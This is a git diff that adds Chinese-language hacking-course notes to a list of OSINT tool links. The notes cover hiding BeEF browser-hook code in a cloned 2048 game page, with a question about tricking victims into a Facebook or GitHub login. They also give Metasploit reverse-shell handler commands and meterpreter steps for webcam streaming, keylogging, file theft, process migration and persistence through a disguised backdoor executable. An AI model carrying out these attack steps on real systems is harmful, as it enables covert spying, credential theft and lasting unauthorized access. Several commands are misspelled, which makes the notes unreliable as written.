@@ -1099,3 +1099,67 @@ Semi-automatic OSINT framework and package manager
 https://github.com/kpcyrd/sn0int
 Open-source python project to handle the storage and linking of open-source intelligence (ala Maltego)
 https://github.com/mgeide/poortego
+
+## fake game
+https://github.com/PacktPublishing/The-Complete-Ethical-Hacking-Course
+
+github.com 2048
+https://github.com/atilsamancioglu/2048
+apt install apache2
+cd /var/www/html
+git clone https://github.com/atilsamancioglu/2048
+
+beef
+./install
+/opt/beef/extensions/metasploit/config.yaml
+./beef
+
+把beef-xss代码加把 2048的index.hmtl中去
+
+facebook steal
+Q：beef能否有自动脚本，比如一个人上当后，让他马上用github facebook登录
+
+有点像花生壳，有免费的域名
+https://www.noip.com
+
+## meterpreter
+
+获得一个 meterpreter 会话后我们能做什么？
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST 10.0.2.15
+exploit
+session -l
+session -1
+进入会话后：
+systeminfo
+help
+webcam_stream
+
+### migratie
+ps
+能看到比如 explore.exe 进程是 2824
+那么执行
+migratie 2824
+### 上传下载文件
+upload 文件名
+download 文件名
+
+### keylogs
+keyscan_start
+keyscan_dump
+screenshot
+
+### 执久化
+
+background
+use exploit/windows/local/persisstence
+show options
+set EXE_NAME winexplore.exe
+show advanced
+set EXE:Custom /var/www/html/backdoors/kirk_newpayload.exe
+exploit 就会注射到前面的会话中去
+
+
